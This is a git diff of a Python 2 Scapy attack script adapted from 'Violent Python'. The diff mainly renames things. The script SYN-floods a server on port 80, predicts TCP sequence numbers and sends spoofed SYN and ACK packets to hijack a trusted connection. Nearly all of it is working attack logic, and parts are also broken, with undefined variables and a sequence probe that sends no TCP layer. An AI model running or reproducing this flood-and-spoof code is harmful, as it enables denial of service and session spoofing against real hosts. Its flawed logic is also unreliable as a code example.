@@ -1,3 +1,4 @@
+
 #!/usr/bin/env python2
 # written by Moses Arocha
 # Written with the help of TJ O'Connor in his book "Violent Python"
@@ -6,36 +7,36 @@ import optparse
 from scapy.all import *
 
 # Attempts to silence the server by sending SYN Packets to the server, will send exactly 64,511 packets and if it doesn't succeed it will end
-def synFlood(src, tgt):
+def SynAttack(src, target):
 	for sport in range(1024, 65535):
-		IPlayer = IP(src=src, dst=tgt)
+		IPlayer = IP(src=src, dst=target)
 		TCPlayer = TCP(sport=sport, dport=80)	# Will attack the server on port 80
 		pkt = IPlayer / TCPlayer
 		send(pkt)
 
 # Will grab the sequence number of the TCP packets sent, after grabbing the increasing numbers, subtract them, then will tell the difference
-def callTSN(tgt):
-	seqNum = 0
+def callTSN(target):
+	PredictSequence = 0
 	preNum = 0
 	diffSeq = 0
 	for x in range(1, 5):			
 		if preNum != 0:
-			preNum = seqNum
-		pkt = IP(dst=tgt)
+			preNum = PredictSequence
+		pkt = IP(dst=target)
 		ans = sr1(pkt, verbose=0)
-		seqNum = ans.getlayer(TCP).seq		# May or may not work, depending on the enviroment run on
-		diffSeq = SeqNum - repNum
+		PredictSequence = ans.getlayer(TCP).seq		# May or may not work, depending on the enviroment run on
+		diffSeq = PredictSequence - repNum
 		print '\t[+] TCP Sequence Difference: ' + str(diffSeq)
-	return seqNum + diffSeq
+	return PredictSequence + diffSeq
 
 # Will then attempt to spoof the connection, by sending in packets from the Host, to the attacking target
 # This program will go through the entire SYN-ACK handshake, first it will send the SYN packet, then the ACK packet
-def SpoofConn(src, tgt, ack):
-	IPlayer = IP(src=src, dst=tgt)
+def AttemptSpoof(src, target, ack):
+	IPlayer = IP(src=src, dst=target)
 	TCPlayer = TCP(sport=80, dport=81)
 	synPkt = IPlayer / TCPlayer
 	send(synPkt)				# (Sending the SYN Packet)
-	IPlayer = IP(src=src, dst=tgt)
+	IPlayer = IP(src=src, dst=target)
 	TCPlayer = TCP(sport=80, dport=81)
 	ackPkt = IPlayer / TCPlayer
 	send(ackPkt)				# (Sending the ACK Packet)
@@ -46,21 +47,21 @@ def main():
 	parser = optparse.OptionParser("Usages From Program: -S <Source for SYN Flood> -R <Source for Spoofed Connection> -T <Target Address>")
 	parser.add_option('--SRC', dest='synSpoof', type='string', help='Specific src for SYN Flood')
 	parser.add_option('--SPOOF', dest='srcSpoof', type='string', help='Specific src for spoofed connection')
-	parser.add_option('--TAR', dest='tgt', type='string', help='specify target address')
+	parser.add_option('--TAR', dest='target', type='string', help='specify target address')
 	(options, args) = parser.parse_args()
-	if options.synSpoof == None or options.srcSpoof == None or options.tgt == None:
+	if options.synSpoof == None or options.srcSpoof == None or options.target == None:
 		print parser.usage
 		exit(0)
 	else:
 		synSpoof = options.synSpoof
 		srcSpoof = options.srcSpoof
-		tgt = options.tgt
+		target = options.target
 	print '\t[+] Starting SYN Flood To Kill Server'
-	synFlood(synSpoof, srcSpoof)
+	SynAttack(synSpoof, srcSpoof)				# Will call the SYNAttack function
 	print '\t[+] Calculating correct TCP Sequence Number'
-	seqNum = callTSN(tgt) + 1
+	PredictSequence = callTSN(target) + 1				# Will call the PredictSequence function
 	print '\t[+] Attempting To Spoof TCP Connection'
-	spoofConn(srcSpoof, tgt, seqNum)
+	AttemptSpoof(srcSpoof, target, PredictSequence)		# Will call the call the AttemptSpoof function
 	print '\t[+] Task Complete'
 	
 if __name__ == '__main__':
